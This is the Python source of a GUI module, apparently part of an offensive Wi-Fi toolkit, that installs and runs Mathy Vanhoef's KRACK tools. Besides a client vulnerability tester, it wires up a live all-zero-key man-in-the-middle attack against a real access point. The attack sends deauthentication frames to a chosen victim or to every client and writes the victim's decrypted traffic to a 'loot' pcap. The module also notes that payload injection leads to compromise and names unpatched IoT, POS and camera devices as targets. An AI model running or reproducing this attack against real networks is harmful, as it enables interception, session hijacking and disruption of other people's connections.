"""KRACK Attack -- tester + live all-zero-key attack.

Two upstream repos from Mathy Vanhoef:

  * `krackattacks-scripts <https://github.com/vanhoefm/krackattacks-scripts>`_
    (rama ``research``) -- the tester. Stands up a rogue AP with a
    fixed SSID/PSK and waits for the *operator to associate the
    target device manually*. Runs the 7 Wi-Fi-Alliance-style
    vulnerability checks. Confirms whether the target reinstalls
    the pairwise key, the group key, or leaks the RSC.
  * `krackattacks-poc-zerokey <https://github.com/vanhoefm/krackattacks-poc-zerokey>`_
    (rama ``research``) -- the *offensive* PoC. Channel-based
    multi-channel MITM against a live target AP. Forces the client
    to reinstall an all-zero PTK (wpa_supplicant ≤ 2.6 / Android
    6.x-7.x) and decrypts client → AP traffic in real time via a
    ``tap`` interface. No PSK required. Vanhoef abandoned it in
    2018 but the code still works on modern Kali.

This module wires up both. The UI has a "Test vulnerability" tab
for the tester and an "Live attack" tab for the PoC. Both share
the installer that clones the two repos under ``/opt/`` (repo
tree is world-readable, venv writable by kali via chown after
install).

Hardware model:

  * Tester: 1 rogue-AP interface. ath9k_htc (AR9271) preferred;
    hostapd on that iface + user manually connects the target
    to SSID ``testnetwork`` / PSK ``abcdefgh``.
  * Live attack: **2 injection-capable interfaces** minimum -- one
    for the rogue AP clone, one for the uplink to the real AP.
    Vanhoef's docs verify AR9271 + Intel AC-7260. Broadcom is
    not usable.  The phone's internal ath10k_snoc does *not*
    work; plug in two AR9271 dongles or one AR9271 + one MT7612U.

What the live attack does and doesn't do:

  * ✅ Decrypts *client → AP* traffic when the client is vulnerable.
  * ✅ Injects frames into the client's active session.
  * ✅ Enables TCP hijack / plaintext-HTTP payload injection.
  * ❌ Does NOT recover the network PSK.
  * ❌ Does NOT give RCE by itself; payload injection is the vector.
  * ⚠️ Silently fails if the target device is patched.
"""
from __future__ import annotations

import os
import re
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, toast

# --------------------------------------------------------- upstream ---
_TESTER_REPO = "https://github.com/vanhoefm/krackattacks-scripts.git"
_TESTER_DIR = Path("/opt/krackattacks-scripts")
_TESTER_MAIN = _TESTER_DIR / "krackattack" / "krack-test-client.py"
_TESTER_FT = _TESTER_DIR / "krackattack" / "krack-ft-test.py"

_POC_REPO = "https://github.com/vanhoefm/krackattacks-poc-zerokey.git"
_POC_DIR = Path("/opt/krackattacks-poc-zerokey")
_POC_MAIN = _POC_DIR / "krackattack" / "krack-all-zero-tk.py"

# --------------------------------------------------------- test cases -
_CLIENT_TESTS = [
    ("Ordinary 4-way handshake replay (CVE-2017-13077 + 13078)",
     [],
     "PTK reinstall by replaying encrypted M3. Highest impact; "
     "flag test to run first."),
    ("With forged M1 (--tptk)",
     ["--tptk"],
     "For clients using Temporal PTK construction, same ANonce. "
     "wpa_supplicant 2.6 needs this."),
    ("With forged M1, random ANonce (--tptk-rand)",
     ["--tptk-rand"],
     "Same as --tptk but with a random ANonce in the forged M1."),
    ("Group key reinstall (--group, CVE-2017-13080)",
     ["--group"],
     "Tests reinstall of the GTK during the group-key handshake."),
    ("Broadcast replay tolerance (--replay-broadcast)",
     ["--replay-broadcast"],
     "Baseline test. If the client accepts replayed broadcast "
     "frames, patch that first before trusting the other tests."),
    ("GTK RSC leak in group handshake (--group --gtkinit)",
     ["--group", "--gtkinit"],
     "Verifies the RSC the client installs from a group handshake."),
    ("GTK RSC leak in 4-way (--gtkinit)",
     ["--gtkinit"],
     "Retransmits M3/4 with a high replay counter to detect if the "
     "client installs the GTK with a leaked RSC."),
]


# --------------------------------------------------------- module -----
@register
class Krack(NHModule):
    title = "KRACK Attack"
    icon = "channel-secure-symbolic"
    description = ("Vanhoef's KRACK: tester (7 client checks + FT AP "
                   "test) *and* live all-zero-key MITM attack that "
                   "decrypts client -> AP traffic in real time.")
    required_tools = []

    def __init__(self, app_window):
        super().__init__(app_window)
        self._proc: Process | None = None
        self._loot_id: int | None = None

    # ---------------------------------------------------------- build
    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        # ---- intro ----
        intro = Adw.PreferencesGroup(
            title="What KRACK does",
            description="Two modes: a vulnerability tester (rogue AP + "
                        "target you enroll manually), and a live "
                        "channel-based MITM against a real AP that "
                        "decrypts the victim's traffic. Neither "
                        "recovers the network PSK.")
        intro.add(Adw.ActionRow(
            title="Reference",
            subtitle="https://www.krackattacks.com"))
        box.append(intro)

        # ---- hardware ----
        hw = Adw.PreferencesGroup(
            title="Hardware",
            description="Live attack needs TWO injection-capable "
                        "interfaces; AR9271 (ath9k_htc) is the tested "
                        "chipset. Hardware crypto must be disabled.")
        driver = self._detect_driver()
        hw.add(Adw.ActionRow(
            title="Primary Wi-Fi driver",
            subtitle=driver + (
                " -- OK" if driver.startswith("ath9k") else
                " -- NOT ath9k_htc; plug in AR9271 dongles")))
        box.append(hw)

        # ---- install (both repos) ----
        inst = Adw.PreferencesGroup(
            title="Installation",
            description="Both repos land under /opt. Runs as root "
                        "because /opt is not user-writable; the "
                        "trees are chowned to kali after install "
                        "so we can source their venvs from the app "
                        "context.")
        self.tester_row = Adw.ActionRow(
            title="Tester repo",
            subtitle=str(_TESTER_DIR) +
                     (" -- installed" if _TESTER_MAIN.exists()
                      else " -- not installed"))
        tester_btn = Gtk.Button(label="Install",
                                valign=Gtk.Align.CENTER)
        tester_btn.add_css_class("suggested-action")
        tester_btn.connect("clicked",
                           lambda _b: self._install_tester())
        self.tester_row.add_suffix(tester_btn)
        inst.add(self.tester_row)

        self.poc_row = Adw.ActionRow(
            title="Live attack (all-zero-key PoC)",
            subtitle=str(_POC_DIR) +
                     (" -- installed" if _POC_MAIN.exists()
                      else " -- not installed"))
        poc_btn = Gtk.Button(label="Install",
                             valign=Gtk.Align.CENTER)
        poc_btn.add_css_class("suggested-action")
        poc_btn.connect("clicked",
                        lambda _b: self._install_poc())
        self.poc_row.add_suffix(poc_btn)
        inst.add(self.poc_row)

        hwc_row = Adw.ActionRow(
            title="Disable hardware crypto",
            subtitle="/etc/modprobe.d/nohwcrypt.conf; reboot")
        hwc_btn = Gtk.Button(label="Disable HW crypto",
                             valign=Gtk.Align.CENTER)
        hwc_btn.connect("clicked",
                        lambda _b: self._disable_hwcrypto())
        hwc_row.add_suffix(hwc_btn)
        inst.add(hwc_row)
        box.append(inst)

        # ---- TESTER: client test config ----
        test = Adw.PreferencesGroup(
            title="Test client vulnerability (rogue-AP)",
            description="Enroll the target device manually against "
                        "SSID 'testnetwork' / PSK 'abcdefgh' after "
                        "you press Run.")
        self.iface = Adw.EntryRow(title="Rogue-AP interface")
        self.iface.set_text("wlan1")
        test.add(self.iface)

        self.testcase = Adw.ComboRow(title="Test case")
        self.testcase.set_model(Gtk.StringList.new(
            [t[0] for t in _CLIENT_TESTS]))
        test.add(self.testcase)

        self.hint_row = Adw.ActionRow(
            title="Details", subtitle=_CLIENT_TESTS[0][2])
        test.add(self.hint_row)
        self.testcase.connect(
            "notify::selected",
            lambda *_: self.hint_row.set_subtitle(
                _CLIENT_TESTS[self.testcase.get_selected()][2]))

        run_row = Adw.ActionRow(
            title="Run selected test",
            subtitle="Look for 'reinstalls the pairwise/group key' "
                     "or 'installing all-zero key' in the log")
        self.run_btn = Gtk.Button(label="Run",
                                  valign=Gtk.Align.CENTER)
        self.run_btn.add_css_class("destructive-action")
        self.run_btn.connect("clicked",
                             lambda _b: self._run_client_test())
        run_row.add_suffix(self.run_btn)
        self.stop_btn = Gtk.Button(label="Stop",
                                   valign=Gtk.Align.CENTER)
        self.stop_btn.set_sensitive(False)
        self.stop_btn.connect("clicked", lambda _b: self._stop())
        run_row.add_suffix(self.stop_btn)
        test.add(run_row)
        box.append(test)

        # ---- TESTER: 802.11r FT AP test ----
        ft = Adw.PreferencesGroup(
            title="Test AP: 802.11r FT (CVE-2017-13082)",
            description="Wraps wpa_supplicant. Roam the client via "
                        "wpa_cli in a terminal and watch for IV "
                        "reuse from the AP.")
        self.ft_iface = Adw.EntryRow(title="Managed interface")
        self.ft_iface.set_text("wlan1")
        ft.add(self.ft_iface)
        self.ft_ssid = Adw.EntryRow(title="Target SSID (FT-PSK)")
        ft.add(self.ft_ssid)
        self.ft_psk = Adw.PasswordEntryRow(title="Target PSK")
        ft.add(self.ft_psk)
        ft_run = Adw.ActionRow(
            title="Run FT test",
            subtitle="Requires an AP with 802.11r enabled")
        self.ft_btn = Gtk.Button(label="Run FT",
                                 valign=Gtk.Align.CENTER)
        self.ft_btn.connect("clicked",
                            lambda _b: self._run_ft_test())
        ft_run.add_suffix(self.ft_btn)
        ft.add(ft_run)
        box.append(ft)

        # ---- LIVE ATTACK ----
        atk = Adw.PreferencesGroup(
            title="Live attack (all-zero-TK MITM)",
            description="Channel-based MITM against a real target AP. "
                        "Decrypts the victim client's traffic in real "
                        "time via a tap0 interface. Only works when "
                        "the victim runs wpa_supplicant <= 2.6 / "
                        "Android 6.x-7.x (unpatched IoT, POS, cams).")

        self.atk_ap_iface = Adw.EntryRow(
            title="Rogue-AP interface (clone)")
        self.atk_ap_iface.set_text("wlan1")
        atk.add(self.atk_ap_iface)

        self.atk_uplink_iface = Adw.EntryRow(
            title="Uplink interface (relay to real AP)")
        self.atk_uplink_iface.set_text("wlan2")
        atk.add(self.atk_uplink_iface)

        self.atk_target_ssid = Adw.EntryRow(
            title="Target SSID (real AP)")
        atk.add(self.atk_target_ssid)

        self.atk_target_bssid = Adw.EntryRow(
            title="Target BSSID")
        atk.add(self.atk_target_bssid)

        self.atk_target_channel = Adw.SpinRow.new_with_range(
            1, 165, 1)
        self.atk_target_channel.set_title("Target real channel")
        self.atk_target_channel.set_value(6)
        atk.add(self.atk_target_channel)

        self.atk_rogue_channel = Adw.SpinRow.new_with_range(
            1, 11, 1)
        self.atk_rogue_channel.set_title(
            "Rogue clone channel (must differ)")
        self.atk_rogue_channel.set_value(1)
        atk.add(self.atk_rogue_channel)

        self.atk_target_psk = Adw.PasswordEntryRow(
            title="Target PSK (optional; not required)")
        atk.add(self.atk_target_psk)

        self.atk_deauth = Adw.SwitchRow(
            title="Send deauth to force reconnect",
            subtitle="mdk4 / aireplay against the victim MAC to "
                     "kick it into re-associating via us")
        atk.add(self.atk_deauth)

        self.atk_victim_mac = Adw.EntryRow(
            title="Victim MAC (for deauth; blank = broadcast)")
        atk.add(self.atk_victim_mac)

        atk_run_row = Adw.ActionRow(
            title="Run live attack",
            subtitle="Decrypted client traffic writes to "
                     "~/loot/krack/decrypt-*.pcap via tap0")
        self.atk_btn = Gtk.Button(label="Attack",
                                  valign=Gtk.Align.CENTER)
        self.atk_btn.add_css_class("destructive-action")
        self.atk_btn.connect("clicked",
                             lambda _b: self._run_live_attack())
        atk_run_row.add_suffix(self.atk_btn)
        self.atk_stop_btn = Gtk.Button(label="Stop",
                                       valign=Gtk.Align.CENTER)
        self.atk_stop_btn.set_sensitive(False)
        self.atk_stop_btn.connect(
            "clicked", lambda _b: self._stop())
        atk_run_row.add_suffix(self.atk_stop_btn)
        atk.add(atk_run_row)
        box.append(atk)

        # ---- expectations ----
        exp = Adw.PreferencesGroup(
            title="What to expect from the live attack",
            description="")
        for t, s in (
            ("Decrypt client -> AP traffic",
             "yes, if victim is vulnerable"),
            ("Inject frames into the session",
             "yes (TKIP/GCMP best; CCMP limited)"),
            ("Recover network PSK",
             "no -- the attack doesn't touch the passphrase"),
            ("RCE against the victim",
             "no by itself; combine with HTTP payload injection"),
            ("HTTPS with HSTS",
             "resists -- you'll only see ciphertext"),
        ):
            exp.add(Adw.ActionRow(title=t, subtitle=s))
        box.append(exp)

        # ---- output ----
        self.output = OutputView()
        box.append(self.output)
        return box

    # -------------------------------------------------------- helpers
    def _detect_driver(self) -> str:
        try:
            for phy in Path("/sys/class/ieee80211").iterdir():
                drv = phy / "device" / "driver"
                if drv.exists():
                    return os.readlink(drv).rsplit("/", 1)[-1]
        except OSError:
            pass
        return "?"

    def _install_repo(self, repo: str, dest: Path,
                       build: bool = True, venv: bool = True,
                       row: Adw.ActionRow | None = None,
                       label: str = "",
                       needs_py2to3: bool = False) -> None:
        """Common installer: clone into /opt/<name>, optionally build
        the modified hostapd, optionally create the Python venv, then
        chown the tree to kali:kali so the app can source venv/ from
        the login user.

        Vanhoef's forks are from 2017-2021 and need a handful of
        compat patches to run on modern Kali (OpenSSL 3, Scapy 2.5,
        Python 3.13). We apply them inline here so the operator gets
        a working install without having to re-derive the patches
        every time.

        :param needs_py2to3: applies to ``krackattacks-poc-zerokey``
            which was written in Python 2. When set, the main
            script (``krack-all-zero-tk.py``) and ``wpaspy.py`` get
            a small ``except X, e:`` -> ``except X as e:``,
            ``print stmt`` -> ``print(stmt)`` sweep in addition to
            the shebang swap.
        """
        self.output.append("# installing %s to %s…\n" % (label, dest))

        parts = [
            "set -e",
            "mkdir -p /opt",
            "if [ ! -d %s/.git ]; then "
            "  git clone --depth 1 -b research %s %s; "
            "else "
            "  git -C %s pull --ff-only; "
            "fi" % (dest, repo, dest, dest),
        ]
        if build:
            # Patch #1: OpenSSL 3 in Kali 2024+ dropped default
            # visibility for a few EC key APIs Vanhoef's crypto_openssl
            # calls. Ensure ``<openssl/provider.h>`` is included, which
            # is where the surviving accessors live.
            parts.append(
                "if [ -f %s/src/crypto/crypto_openssl.c ] && "
                "   ! grep -q 'openssl/provider.h' "
                "        %s/src/crypto/crypto_openssl.c; then "
                "  sed -i '/#include <openssl\\/opensslv.h>/a "
                "#include <openssl/provider.h>' "
                "     %s/src/crypto/crypto_openssl.c; "
                "fi" % (dest, dest, dest))
            # Vanhoef repos ship a build.sh in krackattack/. Fall back
            # to a manual build if that script is missing.
            parts.append(
                "if [ -x %s/krackattack/build.sh ]; then "
                "  (cd %s/krackattack && ./build.sh); "
                "elif [ -x %s/build.sh ]; then "
                "  (cd %s && ./build.sh); "
                "elif [ -f %s/hostapd/Makefile ]; then "
                "  (cd %s/hostapd && cp -n defconfig .config; "
                "   make -j2); "
                "fi" % (dest, dest, dest, dest, dest, dest))
        if venv:
            # We build the venv with python3.13 (NOT the newer 3.14
            # that Kali ships as default python3): scapy 2.5.0 -- the
            # only version that still exposes scapy.contrib.wpa_eapol
            # AND works with Vanhoef's libwifi -- imports fine on
            # 3.13 but not 3.14. Fall back to plain python3 if 3.13
            # is not available on this host.
            parts.append(
                "PY=$(command -v python3.13 || command -v python3); "
                "if [ -x %s/krackattack/pysetup.sh ]; then "
                # Prime the pysetup.sh venv to use the right python.
                "  ( cd %s/krackattack && "
                "    sed -i 's|python3 -m venv|'$PY' -m venv|' "
                "         pysetup.sh; "
                "    ./pysetup.sh ); "
                "else "
                # No pysetup.sh (older PoC layout): roll one by hand
                # against the tester's requirements.txt if it exists,
                # otherwise a hand-picked scapy+pycryptodome pair.
                "  V=%s/krackattack/venv; "
                "  $PY -m venv $V; "
                "  . $V/bin/activate; "
                "  pip install --quiet wheel; "
                "  if [ -f /opt/krackattacks-scripts/krackattack/"
                "requirements.txt ]; then "
                "    pip install --quiet -r "
                "      /opt/krackattacks-scripts/krackattack/"
                "requirements.txt; "
                "  else "
                "    pip install --quiet scapy==2.5.0 pycryptodome; "
                "  fi; "
                "  sed -i 's/find_library(\"libc\")/"
                "find_library(\"c\")/g' "
                "    $V/lib/python*/site-packages/scapy/arch/bpf/"
                "core.py 2>/dev/null || true; "
                "fi"
                % (dest, dest, dest))
            # Patch #2: scapy 2.5 removed ``L2Socket`` from
            # ``scapy.all``'s star export. Add an explicit import
            # so libwifi/wifi.py's ``class MonitorSocket(L2Socket)``
            # resolves.
            parts.append(
                "for wifi in %s/krackattack/libwifi/wifi.py "
                "            %s/research/libwifi/wifi.py; do "
                "  [ -f $wifi ] || continue; "
                "  if ! grep -q 'scapy.arch.linux import L2Socket' "
                "         $wifi; then "
                "    sed -i '1a from scapy.arch.linux import "
                "L2Socket' $wifi; "
                "  fi; "
                "done" % (dest, dest))
        if needs_py2to3:
            # PoC-zerokey is Python 2. Convert the two files that
            # matter with a tiny in-place fixup.
            parts.append(
                "for f in %s/krackattack/krack-all-zero-tk.py "
                "         %s/krackattack/wpaspy.py; do "
                "  [ -f $f ] || continue; "
                "  sed -i 's|/usr/bin/env python2|"
                "/usr/bin/env python3|' $f; "
                "  sed -i -E 's/except (subprocess.CalledProcessError|"
                "Exception), (\\w+):/except \\1 as \\2:/g' $f; "
                "  python3 -c \"import re,pathlib; "
                "p=pathlib.Path('$f'); "
                "p.write_text(re.sub(r'^(\\s*)print (.+)$', "
                "r'\\1print(\\2)', p.read_text(), flags=re.M))\"; "
                "done" % (dest, dest))
            # Patch #3: the PoC main script does ``from scapy.all "
            # import *`` and expects L2Socket to come with it. It
            # doesn't (see #2); add the explicit import.
            parts.append(
                "if [ -f %s/krackattack/krack-all-zero-tk.py ] && "
                "   ! grep -q 'scapy.arch.linux import L2Socket' "
                "        %s/krackattack/krack-all-zero-tk.py; then "
                "  sed -i '/from scapy.all import \\*/a "
                "from scapy.arch.linux import L2Socket' "
                "     %s/krackattack/krack-all-zero-tk.py; "
                "fi" % (dest, dest, dest))
        parts.append("chown -R kali:kali %s || true" % dest)
        parts.append("echo ---installed---")

        script = "; ".join(parts)

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            if row is not None:
                exists = (dest / "krackattack").exists()
                row.set_subtitle(
                    str(dest) +
                    (" -- installed" if exists else
                     " -- install failed; see log"))
            toast(self.app_window,
                  label + " install finished")

        # Root because /opt.
        run_async(["sh", "-c", script], done,
                  root=True, timeout=900)

    def _install_tester(self) -> None:
        self._install_repo(_TESTER_REPO, _TESTER_DIR,
                            row=self.tester_row, label="tester")

    def _install_poc(self) -> None:
        # PoC is Python 2, needs the 2to3 sweep on top of the
        # common OpenSSL / Scapy patches.
        self._install_repo(_POC_REPO, _POC_DIR,
                            row=self.poc_row,
                            label="live-attack PoC",
                            needs_py2to3=True)

    def _disable_hwcrypto(self) -> None:
        conf = (
            "options ath9k nohwcrypt=1\n"
            "options ath9k_htc nohwcrypt=1\n"
            "options ath5k nohwcrypt=1\n"
            "options ath10k_pci nohwcrypt=1\n"
            "options ath10k_snoc nohwcrypt=1\n"
            "options mt76 nohwcrypt=1\n"
            "options mt7601u nohwcrypt=1\n"
            "options mt76x2u nohwcrypt=1\n"
            "options mt7921u nohwcrypt=1\n"
            "options rt2800pci nohwcrypt=1\n"
            "options rt2800usb nohwcrypt=1\n"
            "options rt73usb nohwcrypt=1\n"
            "options rtl8xxxu nohwcrypt=1\n"
            "options carl9170 nohwcrypt=1\n"
        )
        b64 = __import__("base64").b64encode(
            conf.encode()).decode()
        script = (
            "printf '%s' | base64 -d > /etc/modprobe.d/nohwcrypt.conf "
            "&& echo written /etc/modprobe.d/nohwcrypt.conf"
        ) % b64

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            toast(self.app_window,
                  "HW crypto disabled -- reboot recommended")

        run_async(["sh", "-c", script], done,
                  root=True, timeout=10)

    # ------------------------------------------------- client test
    def _run_client_test(self) -> None:
        if self._proc is not None and self._proc.running:
            return
        if not _TESTER_MAIN.exists():
            toast(self.app_window,
                  "Install the tester repo first")
            return
        iface = self.iface.get_text().strip() or "wlan1"
        idx = self.testcase.get_selected()
        label, extra, _hint = _CLIENT_TESTS[idx]

        conf_path = _TESTER_DIR / "hostapd" / "hostapd.conf"
        rewrite = (
            "sed -i.bak "
            "  -e 's|^interface=.*|interface=%s|' %s"
        ) % (iface, conf_path)
        run_async(
            ["sh", "-c", rewrite], lambda _r: None,
            root=False, timeout=5)

        argv_str = (
            "cd %s/krackattack && "
            "sudo bash -c '"
            "  source venv/bin/activate && "
            "  ./krack-test-client.py %s"
            "'"
        ) % (_TESTER_DIR, " ".join(extra))
        self.output.append("$ " + argv_str + "\n")

        stamp = time.strftime("%Y%m%d-%H%M%S")
        log_path = loot_path(
            "krack",
            "krack-client-%s-%s.log"
            % (re.sub(r"[^A-Za-z0-9]+", "_", label)[:40], stamp))
        self._loot_id = get_loot_store().record(
            module="krack", type="krack_log",
            target=label, path=log_path, notes="running")

        verdict_seen = {"vuln": False}

        def on_line(text: str) -> None:
            self.output.append(text)
            try:
                with open(log_path, "a") as fp:
                    fp.write(text)
            except OSError:
                pass
            up = (text or "").lower()
            for marker in ("reinstalls the pairwise key",
                           "reinstalls the group key",
                           "iv reuse detected",
                           "installing the all-zero key",
                           "device is vulnerable"):
                if marker in up:
                    verdict_seen["vuln"] = True
                    if self._loot_id is not None:
                        get_loot_store().append_notes(
                            self._loot_id,
                            "VULNERABLE: " + marker)

        def on_done(code: int) -> None:
            self.output.append("[krack tester exited: %d]\n" % code)
            self._proc = None
            self.run_btn.set_sensitive(True)
            self.stop_btn.set_sensitive(False)
            self.atk_btn.set_sensitive(True)
            self.atk_stop_btn.set_sensitive(False)
            self.ft_btn.set_sensitive(True)
            if self._loot_id is not None:
                get_loot_store().refresh_size(self._loot_id)
                if not verdict_seen["vuln"]:
                    get_loot_store().append_notes(
                        self._loot_id,
                        "no vulnerability marker before exit")

        self._proc = Process(
            ["sh", "-c", argv_str], on_line, on_done, root=False)
        self._proc.start()
        self.run_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)

    def _stop(self) -> None:
        if self._proc is not None:
            self._proc.stop()
        self.stop_btn.set_sensitive(False)
        self.atk_stop_btn.set_sensitive(False)

    # ------------------------------------------------- FT AP test
    def _run_ft_test(self) -> None:
        if self._proc is not None and self._proc.running:
            return
        if not _TESTER_FT.exists():
            toast(self.app_window, "Install the tester repo first")
            return
        iface = self.ft_iface.get_text().strip() or "wlan1"
        ssid = self.ft_ssid.get_text().strip()
        psk = self.ft_psk.get_text().strip()
        if not ssid or not psk:
            toast(self.app_window,
                  "Set target SSID and PSK first")
            return

        wpa_conf = (
            "ctrl_interface=/var/run/wpa_supplicant\n"
            "network={\n"
            "  ssid=\"" + ssid + "\"\n"
            "  key_mgmt=FT-PSK\n"
            "  psk=\"" + psk + "\"\n"
            "}\n"
        )
        conf_path = "/tmp/nhp-krack-ft.conf"
        b64 = __import__("base64").b64encode(
            wpa_conf.encode()).decode()
        write = ("printf '%s' | base64 -d > %s" % (b64, conf_path))
        run_async(
            ["sh", "-c", write], lambda _r: None,
            root=False, timeout=5)

        argv_str = (
            "cd %s/krackattack && "
            "sudo bash -c '"
            "  source venv/bin/activate && "
            "  ./krack-ft-test.py wpa_supplicant -D nl80211 "
            "    -i %s -c %s"
            "'"
        ) % (_TESTER_DIR, iface, conf_path)
        self.output.append("$ " + argv_str + "\n")

        stamp = time.strftime("%Y%m%d-%H%M%S")
        log_path = loot_path(
            "krack", "krack-ft-%s-%s.log" % (
                re.sub(r"[^A-Za-z0-9]+", "_", ssid), stamp))
        self._loot_id = get_loot_store().record(
            module="krack", type="krack_ft_log",
            target=ssid, path=log_path, notes="FT roam test")

        def on_line(text: str) -> None:
            self.output.append(text)
            try:
                with open(log_path, "a") as fp:
                    fp.write(text)
            except OSError:
                pass

        def on_done(code: int) -> None:
            self.output.append("[krack-ft exited: %d]\n" % code)
            self._proc = None
            self.ft_btn.set_sensitive(True)
            if self._loot_id is not None:
                get_loot_store().refresh_size(self._loot_id)

        self._proc = Process(
            ["sh", "-c", argv_str], on_line, on_done, root=False)
        self._proc.start()
        self.ft_btn.set_sensitive(False)

    # ------------------------------------------------- LIVE ATTACK
    def _run_live_attack(self) -> None:
        """Fire the all-zero-key PoC as a channel-based MITM against
        a real target AP. Requires two injection interfaces. Decrypted
        client -> AP frames land in ~/loot/krack/decrypt-*.pcap via
        a ``tap0`` the PoC creates."""
        if self._proc is not None and self._proc.running:
            return
        if not _POC_MAIN.exists():
            toast(self.app_window,
                  "Install the live-attack PoC first")
            return

        ap_iface = self.atk_ap_iface.get_text().strip() or "wlan1"
        up_iface = self.atk_uplink_iface.get_text().strip() or "wlan2"
        ssid = self.atk_target_ssid.get_text().strip()
        bssid = self.atk_target_bssid.get_text().strip()
        real_ch = int(self.atk_target_channel.get_value())
        rogue_ch = int(self.atk_rogue_channel.get_value())
        psk = self.atk_target_psk.get_text().strip()

        if not ssid or not bssid:
            toast(self.app_window,
                  "Set target SSID and BSSID first")
            return
        if ap_iface == up_iface:
            toast(self.app_window,
                  "Rogue-AP iface must differ from uplink iface")
            return
        if real_ch == rogue_ch:
            toast(self.app_window,
                  "Rogue clone channel must differ from real channel")
            return

        stamp = time.strftime("%Y%m%d-%H%M%S")
        pcap = loot_path(
            "krack", "krack-attack-%s-%s.pcap"
            % (re.sub(r"[^A-Za-z0-9]+", "_", ssid), stamp))
        log_path = loot_path(
            "krack", "krack-attack-%s-%s.log"
            % (re.sub(r"[^A-Za-z0-9]+", "_", ssid), stamp))

        # krack-all-zero-tk.py argv (from Vanhoef's PoC repo):
        #   krack-all-zero-tk.py <ap-iface> <uplink-iface>
        #     --ssid <ssid> --bssid <BSSID> --channel <real-ch>
        #     --rogue-channel <rogue-ch>
        # PSK is optional; if provided, feeds the offline decrypter
        # for full plaintext dump.  Some forks additionally accept
        # --deauth <mac> for a broadcast/targeted deauth burst
        # before starting the MITM.  We pass it only if set.
        argv = ["./krack-all-zero-tk.py",
                ap_iface, up_iface,
                "--ssid", ssid,
                "--bssid", bssid,
                "--channel", str(real_ch),
                "--rogue-channel", str(rogue_ch)]
        if psk:
            argv += ["--psk", psk]
        victim = self.atk_victim_mac.get_text().strip()
        if self.atk_deauth.get_active():
            argv += ["--deauth", victim or "ff:ff:ff:ff:ff:ff"]

        # Wrap under the venv the PoC provides. We also start a
        # background tcpdump on tap0 so decrypted frames land in a
        # pcap alongside the log. tap0 comes up a second or two into
        # the run when the PoC does the setup.
        cmd = (
            "cd %s/krackattack && "
            "sudo bash -c '"
            "  source venv/bin/activate 2>/dev/null || true; "
            "  ( sleep 3; tcpdump -i tap0 -U -w %s ) & "
            "  TCPDUMP_PID=$!; "
            "  %s ; "
            "  kill $TCPDUMP_PID 2>/dev/null "
            "'"
        ) % (_POC_DIR, pcap, " ".join(argv))
        self.output.append("$ " + cmd + "\n")

        self._loot_id = get_loot_store().record(
            module="krack", type="krack_decrypt_pcap",
            target="%s (%s ch %d)" % (ssid, bssid, real_ch),
            path=pcap, notes="live channel-based MITM")

        def on_line(text: str) -> None:
            self.output.append(text)
            try:
                with open(log_path, "a") as fp:
                    fp.write(text)
            except OSError:
                pass

        def on_done(code: int) -> None:
            self.output.append("[krack live attack exited: %d]\n"
                                % code)
            self._proc = None
            self.atk_btn.set_sensitive(True)
            self.atk_stop_btn.set_sensitive(False)
            if self._loot_id is not None:
                get_loot_store().refresh_size(self._loot_id)

        self._proc = Process(
            ["sh", "-c", cmd], on_line, on_done, root=False)
        self._proc.start()
        self.atk_btn.set_sensitive(False)
        self.atk_stop_btn.set_sensitive(True)
